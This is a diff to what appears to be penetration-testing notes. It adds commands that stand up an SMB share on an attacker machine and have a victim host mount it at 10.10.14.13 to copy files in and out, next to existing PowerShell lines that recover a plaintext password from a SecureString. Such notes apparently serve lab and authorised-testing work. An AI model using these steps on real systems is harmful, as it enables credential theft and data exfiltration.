@@ -20,3 +20,16 @@ $Decrypted = [System.Runtime.InteropServices.marshal]::PtrToStringAuto([System.R
 $temp = New-Object PSCredential ("Decrypt", $InputSecureString) 
 $Decrypted = $temp.GetNetworkCredential().Password
 ```
+
+Local SMB server for file transfers :
+```
+# On attacker
+mkdir share
+sudo impacket-smbserver share -smb2support share -user guest -password guest
+
+# On victim
+net use n: \\10.10.14.13\share /user:guest guest
+copy n:\<file> .
+copy <file> n:\
+
+```
